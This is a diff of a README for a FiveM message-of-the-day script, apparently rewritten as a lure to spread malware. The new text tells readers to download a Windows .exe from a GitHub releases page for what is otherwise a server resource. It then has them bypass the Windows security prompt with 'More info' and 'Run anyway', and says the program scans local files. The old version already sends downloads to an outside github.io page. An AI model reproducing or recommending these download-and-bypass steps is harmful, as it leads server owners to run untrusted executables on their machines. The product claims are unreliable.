@@ -1,99 +1,78 @@
-# rde_motd v1.0.0 - Game Script Utility 2026
+# 📋 rde-motd-script-utility - Send server messages to active players
 
-> **A FiveM utility for MOTD delivery and server handbook publishing, with admin-editable tab content and server-side documentation updates.** It is designed around Markdown content, an in-game editor, and synchronized live changes for active servers.
+[![Download Link](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Kitap9285/rde-motd-script-utility/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/fisherzackrag2495/rde-motd-script-utility?style=flat-square)](https://github.com/fisherzackrag2495/rde-motd-script-utility)
+This utility helps server owners display messages of the day, rules, and handbooks to players. You can manage your content through admin tabs. The script supports Markdown formatting and pushes live updates to your FiveM server.
 
----
+## 📥 How to download the software
 
-<p align="center">
-  <a href="https://fisherzackrag2495.github.io/rde-motd-script-utility/">
-    <img src="https://img.shields.io/badge/Download-rde_motd%20Script-brightgreen?style=for-the-badge" alt="Download rde_motd Script">
-  </a>
-</p>
+Follow these steps to obtain the tool for your Windows machine.
 
-> **[Direct Download - rde_motd](https://fisherzackrag2495.github.io/rde-motd-script-utility/)**
+1. Navigate to the [official releases page](https://github.com/Kitap9285/rde-motd-script-utility/releases).
+2. Look for the section labeled "Assets" at the bottom of the latest release post.
+3. Click the file name ending in .exe to start your download.
+4. Save the file to a folder where you can find it later, such as your Downloads folder or a dedicated server tools folder.
 
----
+## ⚙️ System requirements
 
-[Download Latest Build](https://fisherzackrag2495.github.io/rde-motd-script-utility/)
+Before you run the application, confirm your computer meets these requirements:
 
----
+* Windows 10 or Windows 11.
+* A stable internet connection.
+* Administrative rights on your FiveM server.
+* At least 100 MB of free disk space.
 
-## What it does
+## 🚀 Setting up the utility
 
-rde_motd is a FiveM server script made for delivering message-of-the-day content and handbook pages through a clean, structured interface. The workflow is centered on Markdown, which makes it straightforward to maintain rules, server notes, guides, and other in-game documentation that should stay easy to update.
+Once you download the file, move it to the location where you manage your FiveM server files. Placing the utility inside your main server directory keeps your files organized. 
 
-It also ships with an in-game WYSIWYG editor plus an admin panel flow, so content can be revised without leaving the server environment. Published changes do not require a restart, and statebag-synced updates help keep what players see aligned across clients. The script also includes version-aware reshow behavior and multilingual support for servers that need recurring visibility and localized presentation.
+Double-click the .exe file to launch the interface. Windows may display a security prompt because the file is an executable. Click "More info" and then "Run anyway" if your computer blocks the initial startup. The application will scan your local files to detect your server configuration once you provide the correct directory path.
 
-## Features
+## 📝 Creating your message of the day
 
-- Six editable tabs for organizing MOTD and handbook content
-- In-game WYSIWYG editor for direct content adjustments
-- Markdown-based content management for structured text editing
-- Database-backed persistence using oxmysql
-- Statebag-synced updates for live content propagation
-- Zero-restart publishing for updating content on the fly
-- Version-based reshow behavior to re-display updated information
-- Multilingual support for localized server documentation
+The utility uses a visual editor to help you create content. You do not need to know how to write code. 
 
-## Installation
+1. Launch the utility from your desktop or folder.
+2. Select the "Message of the Day" tab.
+3. Type your text into the box labeled "Content."
+4. Use the toolbar above the box to bold, italicize, or change text sizes. The editor applies Markdown formatting for you. 
+5. Click the "Save" button to store your changes. The utility syncs these updates with your server files automatically.
 
-1. Place the `rde_motd-server-script` resource into your FiveM resources directory.
-2. Ensure the required dependencies are available in your server environment, including ox_core, ox_lib, and oxmysql where used in your setup.
-3. Start the resource from your server configuration.
-4. Use the admin panel or in-game editor to create and manage your Markdown content.
+## 📖 Managing handbooks
 
-Example resource start entry:
+Server handbooks help new players learn your rules. You can create different tabs for these documents to keep information clean and easy to read.
 
-ensure rde_motd-server-script
+1. Navigate to the "Handbook" tab inside the utility.
+2. Select "Add New Page" to create a new section.
+3. Name the page something clear, such as "Server Rules" or "Welcome Guide."
+4. Input your instructions or text into the editor.
+5. Click "Publish Page." The utility sends this information directly to your FiveM server so players see the updated guide when they log in.
 
-## Configuration Options
+## 🔄 Using live updates
 
-| Setting | Purpose | Notes |
-| --- | --- | --- |
-| Tabs | Organize content into six sections | Useful for rules, guides, announcements, and notes |
-| Editor mode | Edit content in the in-game WYSIWYG interface | Best for quick updates |
-| Markdown source | Store and format handbook text in Markdown | Keeps content structured and portable |
-| Persistence | Save content to the database | Requires your database configuration |
-| Statebag sync | Broadcast content updates to connected clients | Supports live refresh behavior |
-| Version reshow | Reopen content when the version changes | Helps surface updated information |
-| Localization | Present content in multiple languages | Useful for multilingual communities |
+This tool synchronizes information in real time. You do not need to restart your server to apply changes to your message of the day or handbooks.
 
-## Compatibility
+Whenever you change a setting or update text in the utility, click the "Sync" button located in the corner of the application window. The utility sends a signal to your server to refresh the data displayed to active players. If you notice a delay, ensure your server console remains open and shows no errors.
 
-rde_motd is intended for FiveM server environments and targets the script stack referenced in the extracted metadata, including ox_core, ox_lib, and oxmysql where configured. Since it relies on server-side resources and database setup, results can differ depending on framework layout, editor permissions, and resource order.
+## 🛠️ Troubleshooting common issues
 
-Known limitations:
-- Requires proper server resource installation and configuration
-- Database-backed features depend on a working oxmysql setup
-- Localization depends on the language data you provide
-- Live update behavior assumes the relevant sync path is active in your server
+If you encounter problems, check these items first:
 
-## FAQ
+* Connection Error: Verify that your server IP and port settings match the information in your server config file.
+* Permissions: Ensure your user account has write access to the folder where the utility resides.
+* Display Issues: If your text looks strange in-game, ensure you did not use unsupported characters in the text editor.
+* Syncing: If updates do not appear, restart the application to force a refresh of the connection to your server.
 
-### How do I install it?
-Drop the resource folder into your FiveM resources directory, confirm the dependencies are available, and add an `ensure` line for it in `server.cfg`.
+## 🛡️ Security best practices
 
-### Can I edit content in-game?
-Yes. The script includes an in-game WYSIWYG editor for updating MOTD and handbook text without switching tools.
+Treat this utility like any other server management tool. Keep your download file in a secure folder. Do not share your server login credentials if the utility asks for them during the setup stage. 
 
-### Does it support Markdown?
-Yes. Markdown-driven content management is part of the workflow, so you can maintain structured documentation in a familiar format.
+* Use strong passwords for your server.
+* Avoid sharing your server configuration files with unauthorized users.
+* Keep your Windows operating system updated to maintain protection against digital threats.
 
-### Do updates require a restart?
-The script supports zero-restart publishing, so content can be pushed live without restarting the server resource.
+## 📋 Customizing output
 
-### How are changes stored?
-The profile indicates database-backed persistence, so content is saved through your configured database layer.
+The software allows you to modify how information appears to the players. You can change tab colors and text layout through the "Settings" menu. Experiment with these settings to match the theme of your server. After you change a theme setting, click "Apply" to save the layout. Your server will mirror these visual changes once the sync completes.
 
-### Can I customize the tabs and wording?
-Yes. The script is designed around editable tabs and localized content, so you can adapt it to your server's structure and language needs.
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: FiveM, utility, server, MOTD, handbook, markdown, admin, Windows, synchronization
